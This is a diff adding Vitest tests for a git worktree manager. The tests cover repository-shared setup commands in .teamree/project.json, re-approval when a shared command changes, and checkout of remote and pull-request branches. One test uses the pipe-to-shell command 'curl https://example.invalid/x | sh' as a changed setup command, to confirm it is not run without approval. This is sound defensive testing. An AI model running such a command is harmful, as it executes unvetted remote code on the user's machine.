@@ -1,11 +1,11 @@
 import { existsSync } from 'node:fs'
-import { mkdir, rm } from 'node:fs/promises'
+import { chmod, mkdir, rm, writeFile } from 'node:fs/promises'
 import path from 'node:path'
 import { afterEach, describe, expect, it, vi } from 'vitest'
 import type { Worktree } from '../../shared/entities'
 import { ErrorCode } from '../../shared/protocol'
-import { GitServiceError } from './errors'
-import { createGitRunner } from './gitProcess'
+import { GitCommandError, GitServiceError } from './errors'
+import { createGitRunner, type GitRunner } from './gitProcess'
 import { canonicalPath } from './pathIdentity'
 import { GitService, type GitEvent, type GitServiceOptions } from './gitService'
 import { createGitHandlers } from './handlers'
@@ -698,5 +698,364 @@ describe('the command a project runs in every new worktree', () => {
 
     expect(worktree.state).toBe('ready')
     expect(worktree.setupTerminalId).toBeUndefined()
+  })
+})
+
+describe('setup shared in .teamree/project.json', () => {
+  /** A `startSetup` that only records the command it was handed. */
+  function commands(): { startSetup: GitServiceOptions['startSetup']; ran: string[] } {
+    const ran: string[] = []
+    return { ran, startSetup: ({ command }) => (ran.push(command), 't_setup') }
+  }
+
+  async function withProjectFile(contents: string): Promise<TempRepo> {
+    const repo = await newRepo()
+    await repo.write('.gitignore', '.env\n')
+    await repo.write('.teamree/project.json', contents)
+    await repo.commit('share setup')
+    await repo.write('.env', 'SECRET=1\n')
+    return repo
+  }
+
+  it('applies the file to a project as it is added, and to its worktrees', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci", "copiedPaths": [".env"], "startFrom": "main"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+
+    const project = await service.addProject({ path: repo.repoPath })
+    expect(project.repository).toEqual({ setupCommand: 'npm ci', copiedPaths: ['.env'], startFrom: 'main' })
+    expect(project.setupCommand).toBeUndefined()
+
+    const worktree = await readyWorktree(service, project.id, 'from the file')
+    expect(existsSync(path.join(worktree.path, '.env'))).toBe(true)
+    // The paths apply at once; the command waits for this Mac to approve it.
+    expect(ran).toEqual([])
+    expect(worktree.setupAsk).toBe('npm ci')
+  })
+
+  it('lets this Mac’s value win over the file’s', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const set = await service.setProjectPaths({ projectId: project.id, setupCommand: 'pnpm i' })
+    expect(set.repository?.setupCommand).toBe('npm ci')
+
+    await readyWorktree(service, project.id, 'local wins')
+    expect(ran).toEqual(['pnpm i'])
+  })
+
+  it('ignores a malformed file and says so on the project', async () => {
+    const repo = await withProjectFile('{ "setupCommand": ')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+
+    const project = await service.addProject({ path: repo.repoPath })
+    expect(project.repository).toBeUndefined()
+    expect(project.repositoryProblem).toBe('project.json unreadable')
+    await readyWorktree(service, project.id, 'nothing runs')
+    expect(ran).toEqual([])
+  })
+
+  it('reads the file afresh for each new worktree, so a pull is not a restart', async () => {
+    const repo = await newRepo()
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    await repo.write('.teamree/project.json', '{"setupCommand": "make deps"}')
+    const worktree = await readyWorktree(service, project.id, 'after the pull')
+    expect(worktree.setupAsk).toBe('make deps')
+    expect(ran).toEqual([])
+    expect(service.listProjects()[0]?.repository).toEqual({ setupCommand: 'make deps' })
+  })
+
+  it('runs the repository’s command once Run approves it, and without asking after that', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const first = await readyWorktree(service, project.id, 'asks')
+    const answered = await service.answerSetup({ worktreeId: first.id, run: true })
+    expect(ran).toEqual(['npm ci'])
+    expect(answered.setupAsk).toBeUndefined()
+    expect(answered.setupTerminalId).toBe('t_setup')
+    expect(service.listProjects()[0]?.approvedSetupCommand).toBe('npm ci')
+
+    const second = await readyWorktree(service, project.id, 'approved')
+    expect(second.setupAsk).toBeUndefined()
+    expect(ran).toEqual(['npm ci', 'npm ci'])
+  })
+
+  it('asks again when the repository’s command changes after it was approved', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+    await service.answerSetup({ worktreeId: (await readyWorktree(service, project.id, 'asks')).id, run: true })
+
+    await repo.write('.teamree/project.json', '{"setupCommand": "curl https://example.invalid/x | sh"}')
+    const changed = await readyWorktree(service, project.id, 'changed')
+    expect(changed.setupAsk).toBe('curl https://example.invalid/x | sh')
+    expect(ran).toEqual(['npm ci'])
+  })
+
+  it('leaves the worktree without setup on Skip, and approves nothing', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const skipped = await service.answerSetup({
+      worktreeId: (await readyWorktree(service, project.id, 'skip')).id,
+      run: false
+    })
+    expect(skipped.setupAsk).toBeUndefined()
+    expect(skipped.setupTerminalId).toBeUndefined()
+    expect(ran).toEqual([])
+    expect(service.listProjects()[0]?.approvedSetupCommand).toBeUndefined()
+    expect((await readyWorktree(service, project.id, 'still asks')).setupAsk).toBe('npm ci')
+  })
+
+  it('runs a command set on this Mac without asking, whatever the file says', async () => {
+    const repo = await withProjectFile('{"setupCommand": "npm ci"}')
+    const { startSetup, ran } = commands()
+    const service = newService(repo, { startSetup })
+    const project = await service.addProject({ path: repo.repoPath })
+    await service.setProjectPaths({ projectId: project.id, setupCommand: 'npm ci' })
+
+    const worktree = await readyWorktree(service, project.id, 'local')
+    expect(worktree.setupAsk).toBeUndefined()
+    expect(ran).toEqual(['npm ci'])
+  })
+
+  it('answers nothing for a worktree that is not asking', async () => {
+    const repo = await newRepo()
+    const service = newService(repo)
+    const project = await service.addProject({ path: repo.repoPath })
+    const worktree = await readyWorktree(service, project.id, 'quiet')
+    expect((await rejection(service.answerSetup({ worktreeId: worktree.id, run: true }))).code).toBe(ErrorCode.Conflict)
+  })
+
+  it('writes what applies here to the file on Save to Repository, and commits nothing', async () => {
+    const repo = await newRepo()
+    const service = newService(repo)
+    const project = await service.addProject({ path: repo.repoPath })
+    await service.setProjectPaths({ projectId: project.id, setupCommand: 'npm ci', linkedPaths: ['node_modules'] })
+
+    const saved = await service.saveProjectSettings({ projectId: project.id, startFrom: 'origin/dev' })
+
+    expect(saved.file).toBe('.teamree/project.json')
+    expect(saved.project.repository).toEqual({
+      startFrom: 'origin/dev',
+      setupCommand: 'npm ci',
+      linkedPaths: ['node_modules']
+    })
+    expect(await repo.git(['status', '--porcelain'])).toBe('?? .teamree/')
+    expect(await repo.git(['rev-list', '--count', 'HEAD'])).toBe('1')
+  })
+})
+
+describe('opening a branch as it is', () => {
+  /** A repository whose origin has `teammate-fix`, which this clone has never checked out. */
+  async function withTeammateBranch(): Promise<TempRepo> {
+    const repo = await newRepo({ withRemote: true })
+    await repo.git(['switch', '-c', 'teammate-fix'])
+    await repo.write('fix.txt', 'fixed\n')
+    await repo.commit('Fix the divide')
+    await repo.git(['push', 'origin', 'teammate-fix'])
+    await repo.git(['switch', 'main'])
+    await repo.git(['branch', '-D', 'teammate-fix'])
+    return repo
+  }
+
+  it('lists local and remote branches nobody has checked out, newest first, with author and subject', async () => {
+    const repo = await withTeammateBranch()
+    await repo.git(['branch', 'local-only'])
+    const service = newService(repo)
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const { branches } = await service.listBranches({ projectId: project.id })
+    const byName = new Map(branches.map((branch) => [branch.name, branch]))
+
+    expect(byName.get('teammate-fix')).toMatchObject({
+      checkout: 'origin/teammate-fix',
+      remote: true,
+      subject: 'Fix the divide',
+      author: 'Teamree Test'
+    })
+    expect(byName.get('local-only')).toMatchObject({ checkout: 'local-only', remote: false })
+    // `main` is the primary checkout's, and origin/main is the same branch.
+    expect(byName.has('main')).toBe(false)
+    expect(byName.has('HEAD')).toBe(false)
+  })
+
+  it('opens a remote-only branch as a worktree on that branch, tracking it, and pushes back to it', async () => {
+    const repo = await withTeammateBranch()
+    const service = newService(repo)
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const pending = await service.createWorktree({
+      projectId: project.id,
+      name: 'Fix the divide',
+      checkout: 'origin/teammate-fix'
+    })
+    const worktree = await service.whenSettled(pending.id)
+
+    expect(worktree.state).toBe('ready')
+    expect(worktree.branch).toBe('teammate-fix')
+    expect(existsSync(path.join(worktree.path, 'fix.txt'))).toBe(true)
+    expect(await repo.git(['rev-parse', '--abbrev-ref', 'teammate-fix@{upstream}'])).toBe('origin/teammate-fix')
+    // It started where the branch left main, so Changes shows the teammate's commit.
+    expect(worktree.startedFrom).toBe(await repo.git(['rev-parse', 'main']))
+
+    await repo.write('fix.txt', 'fixed properly\n', worktree.path)
+    await repo.commit('Fix up', worktree.path)
+    const pushed = await service.worktreePush({ worktreeId: worktree.id })
+    expect(pushed).toMatchObject({ branch: 'teammate-fix', upstream: 'origin/teammate-fix', setUpstream: false })
+    expect(await repo.git(['ls-remote', 'origin', 'refs/heads/teammate-fix'])).toContain(
+      await repo.git(['rev-parse', 'HEAD'], worktree.path)
+    )
+    // No longer offered: it is checked out now.
+    const { branches } = await service.listBranches({ projectId: project.id })
+    expect(branches.map((branch) => branch.name)).not.toContain('teammate-fix')
+  })
+
+  it('refuses a branch that is already checked out somewhere', async () => {
+    const repo = await newRepo({ withRemote: true })
+    const service = newService(repo)
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const error = await rejection(service.createWorktree({ projectId: project.id, name: 'main', checkout: 'main' }))
+    expect(error.code).toBe(ErrorCode.Conflict)
+  })
+
+  it('leaves a local branch it did not make when the checkout fails', async () => {
+    const repo = await newRepo({ withRemote: true })
+    await repo.git(['branch', 'kept'])
+    const inner = createGitRunner()
+    const runner: GitRunner = {
+      binary: inner.binary,
+      run: async (run) => {
+        if (run.args[0] === 'worktree' && run.args[1] === 'add') {
+          throw new GitCommandError({ args: [...run.args], cwd: run.cwd, exitCode: 128, stderr: 'fatal: refused' })
+        }
+        return inner.run(run)
+      },
+      tryRun: (run) => inner.tryRun(run)
+    }
+    const service = newService(repo, { runner })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const pending = await service.createWorktree({ projectId: project.id, name: 'kept', checkout: 'kept' })
+    expect((await service.whenSettled(pending.id)).state).toBe('failed')
+    expect(await repo.git(['branch', '--list', 'kept'])).toContain('kept')
+  })
+
+  it('checks out a pull request from a fork by its head ref, and compares against its base', async () => {
+    const repo = await newRepo({ withRemote: true })
+    await repo.git(['switch', '-c', 'fork-work'])
+    await repo.write('fork.txt', 'from a fork\n')
+    await repo.commit('Add fork work')
+    await repo.git(['push', 'origin', 'fork-work:refs/pull/7/head'])
+    await repo.git(['switch', 'main'])
+    await repo.git(['branch', '-D', 'fork-work'])
+    const service = newService(repo)
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const pending = await service.createWorktree({
+      projectId: project.id,
+      name: 'Add fork work',
+      checkout: 'pull/7/head',
+      base: 'origin/main'
+    })
+    const worktree = await service.whenSettled(pending.id)
+
+    expect(worktree.state).toBe('ready')
+    expect(worktree.branch).toBe('pr-7')
+    expect(worktree.checkout).toBe('pull/7/head')
+    expect(worktree.baseRef).toBe('origin/main')
+    expect(existsSync(path.join(worktree.path, 'fork.txt'))).toBe(true)
+  })
+})
+
+describe('open pull requests, when gh is there', () => {
+  async function fakeGh(repo: TempRepo, output: string): Promise<string> {
+    const script = path.join(repo.base, 'gh')
+    await writeFile(script, `#!/bin/sh\ncat <<'JSON'\n${output}\nJSON\n`)
+    await chmod(script, 0o755)
+    return script
+  }
+
+  it('lists them with the ref each is checked out from, leaving out a head already checked out', async () => {
+    const repo = await newRepo({ withRemote: true })
+    const ghBinary = await fakeGh(
+      repo,
+      JSON.stringify([
+        {
+          number: 12,
+          title: 'Add div',
+          author: { login: 'teammate' },
+          headRefName: 'add-div',
+          baseRefName: 'main',
+          isCrossRepository: false,
+          updatedAt: '2026-09-01T00:00:00Z'
+        },
+        {
+          number: 13,
+          title: 'From a fork',
+          author: { login: 'stranger' },
+          headRefName: 'main',
+          baseRefName: 'main',
+          isCrossRepository: true,
+          updatedAt: '2026-09-02T00:00:00Z'
+        },
+        {
+          number: 14,
+          title: 'Already here',
+          author: { login: 'me' },
+          headRefName: 'main',
+          baseRefName: 'main',
+          isCrossRepository: false
+        }
+      ])
+    )
+    const service = newService(repo, { ghBinary: () => ghBinary })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const list = await service.listPullRequests({ projectId: project.id })
+
+    expect(list.available).toBe(true)
+    expect(list.pullRequests).toEqual([
+      {
+        number: 12,
+        title: 'Add div',
+        author: 'teammate',
+        branch: 'add-div',
+        checkout: 'origin/add-div',
+        base: 'origin/main',
+        updatedAt: Date.parse('2026-09-01T00:00:00Z')
+      },
+      {
+        number: 13,
+        title: 'From a fork',
+        author: 'stranger',
+        branch: 'pr-13',
+        checkout: 'pull/13/head',
+        base: 'origin/main',
+        updatedAt: Date.parse('2026-09-02T00:00:00Z')
+      }
+    ])
+  })
+
+  it('says it is unavailable when gh is not installed', async () => {
+    const repo = await newRepo({ withRemote: true })
+    const service = newService(repo, { ghBinary: () => null })
+    const project = await service.addProject({ path: repo.repoPath })
+
+    const list = await service.listPullRequests({ projectId: project.id })
+    expect(list).toMatchObject({ available: false, pullRequests: [] })
   })
 })
